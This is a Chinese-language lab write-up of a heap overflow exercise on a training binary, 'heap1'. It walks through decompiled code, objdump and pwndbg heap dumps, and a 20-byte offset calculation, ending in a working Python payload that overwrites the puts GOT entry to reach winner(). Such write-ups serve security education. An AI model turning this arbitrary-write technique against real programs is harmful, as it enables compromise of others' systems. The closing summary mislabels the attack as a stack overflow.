# <center>堆溢出实验2</center>

## 实验概述

### 【目的】
1. 运行heap1，得到输出`and we have a winner @ xxxx`
### 【环境】
Liunx
### 【工具】
python,IDA pro
### 【原理】
堆溢出是堆数据区中发生的一种缓冲区溢出。 堆溢出以与基于栈溢出不同的方式被利用。 堆上的内存由应用程序在运行时动态分配，通常包含程序数据。 通过以特定的方式破坏这些数据来执行开发，以使应用程序覆盖诸如链接列表指针的内部结构。 规范堆溢出技术覆盖动态内存分配链接（如malloc元数据），并使用生成的指针交换来覆盖程序函数指针。
## 实验步骤

### 【步骤】
#### heap1
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD *v3; // eax@1
  _DWORD *v4; // ST14_4@1
  _DWORD *v5; // eax@1
  _DWORD *v6; // ST18_4@1

  v3 = malloc(8u);
  v4 = v3;
  *v3 = 1;
  v3[1] = malloc(8u);
  v5 = malloc(8u);
  v6 = v5;
  *v5 = 2;
  v5[1] = malloc(8u);
  strcpy((char *)v4[1], argv[1]);
  strcpy((char *)v6[1], argv[2]);
  puts("and that's a wrap folks!");
  return 0;
}
int winner()
{
  time_t v0; // eax@1

  v0 = time(0);
  return printf("and we have a winner @ %d\n", v0);
}
```

可以看到有两个`strcpy()`，如果在前者构造一个溢出，修改v6[1]的值为一个想要改写的地址，再把第二个参数设为想要改写的值，就实现了任意地址写。
与上一题套路类似，本题需要覆盖`puts()`的got表为`winner()`的地址。
首先寻找需要的地址。
```
$ objdump -R heap1 | grep puts
0804a01c R_386_JUMP_SLOT   puts@GLIBC_2.0
$ objdump -d heap1 | grep winner
080484cb <winner>:

```
这里需要寻找从*v4[1]溢出修改v6[1]的偏移量，假设参数为aaaa bbbb，并在程序结束前下断点，分析堆块结构。
```
pwndbg> b  *0x080485b3
Breakpoint 1 at 0x80485b3
pwndbg> set args aaaa bbbb
pwndbg> r
Starting program: /home/lometsj/prostar/heap1 aaaa bbbb
and that's a wrap folks!

Breakpoint 1, 0x080485b3 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x0
*EBX  0x0
*ECX  0xffffcf40 ◂— 0x3
*EDX  0xf7fb6870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
*EBP  0x0
*ESP  0xffffcf2c —▸ 0xf7e1b637 (__libc_start_main+247) ◂— add    esp, 0x10
*EIP  0x80485b3 (main+193) ◂— lea    esp, dword ptr [ecx - 4]
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x80485b3  <main+193>                 lea    esp, dword ptr [ecx - 4]
   0x80485b6  <main+196>                 ret    
    ↓
   0xf7e1b637 <__libc_start_main+247>    add    esp, 0x10
   0xf7e1b63a <__libc_start_main+250>    sub    esp, 0xc
   0xf7e1b63d <__libc_start_main+253>    push   eax
   0xf7e1b63e <__libc_start_main+254>    call   exit <0xf7e319d0>
 
   0xf7e1b643 <__libc_start_main+259>    xor    ecx, ecx
   0xf7e1b645 <__libc_start_main+261>    jmp    __libc_start_main+50 <0xf7e1b572>
    ↓
   0xf7e1b572 <__libc_start_main+50>     mov    esi, dword ptr [esp + 8]
   0xf7e1b576 <__libc_start_main+54>     test   eax, eax
   0xf7e1b578 <__libc_start_main+56>     lea    edx, dword ptr [esi + 0x40]
─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffcf2c —▸ 0xf7e1b637 (__libc_start_main+247) ◂— add    esp, 0x10
01:0004│      0xffffcf30 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
... ↓
03:000c│      0xffffcf38 ◂— 0x0
04:0010│      0xffffcf3c —▸ 0xf7e1b637 (__libc_start_main+247) ◂— add    esp, 0x10
05:0014│ ecx  0xffffcf40 ◂— 0x3
06:0018│      0xffffcf44 —▸ 0xffffcfd4 —▸ 0xffffd1d5 ◂— 0x6d6f682f ('/hom')
07:001c│      0xffffcf48 —▸ 0xffffcfe4 —▸ 0xffffd1fb ◂— 0x505f434c ('LC_P')
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0  80485b3 main+193
   f 1 f7e1b637 __libc_start_main+247
Breakpoint *0x080485b3
pwndbg> heap
Top Chunk: 0x804b448
Last Remainder: 0

0x804b000 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x1, 
  bk = 0x804b018, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x11
}
0x804b010 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x61616161, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x11
}
0x804b020 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x2, 
  bk = 0x804b038, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x11
}
0x804b030 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x62626262, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x409
}
0x804b040 PREV_INUSE {
  prev_size = 0, 
  size = 1033, 
  fd = 0x20646e61, 
  bk = 0x74616874, 
  fd_nextsize = 0x61207327, 
  bk_nextsize = 0x61727720
}
0x804b448 PREV_INUSE {
  prev_size = 0, 
  size = 134073, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/64w 0x804b000
0x804b000:	0x00000000	0x00000011	0x00000001	0x0804b018
0x804b010:	0x00000000	0x00000011	0x61616161	0x00000000
0x804b020:	0x00000000	0x00000011	0x00000002	0x0804b038
0x804b030:	0x00000000	0x00000011	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000409	0x20646e61	0x74616874
0x804b050:	0x61207327	0x61727720	0x6f662070	0x21736b6c
0x804b060:	0x0000000a	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0f0:	0x00000000	0x00000000	0x00000000	0x00000000

```
再观察ltrace
```
$ ltrace ./heap1 aaaa bbbb
__libc_start_main(0x80484f2, 3, 0xffb59004, 0x80485c0 <unfinished ...>
malloc(8)                                                                                                                     = 0x9e0b008
malloc(8)                                                                                                                     = 0x9e0b018
malloc(8)                                                                                                                     = 0x9e0b028
malloc(8)                                                                                                                     = 0x9e0b038
strcpy(0x9e0b018, "aaaa")                                                                                                     = 0x9e0b018
strcpy(0x9e0b038, "bbbb")                                                                                                     = 0x9e0b038
puts("and that's a wrap folks!"and that's a wrap folks!
)                                                                                              = 25
+++ exited (status 0) +++

```
可以发现从0x0804b018开始存储aaaa，倘若溢出到0x804b02c，即可修改第二次`strcpy()`的地址，0x2c-0x18 = 0x14 = 20,溢出点为20
所以有

```
$ python -c'print "a"*20+"\x1c\xa0\x04\x08"+" \xcb\x84\x04\x08"' | xargs ./heap1
and we have a winner @ 1522796371

```


### 【总结】

本次实验主要熟悉Linux环境下堆溢出，尝试通过堆溢出覆盖（修改）相邻的堆块数据，实现任意地址写。
可以发现，要使堆溢出发生，要满足以下条件：

- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。
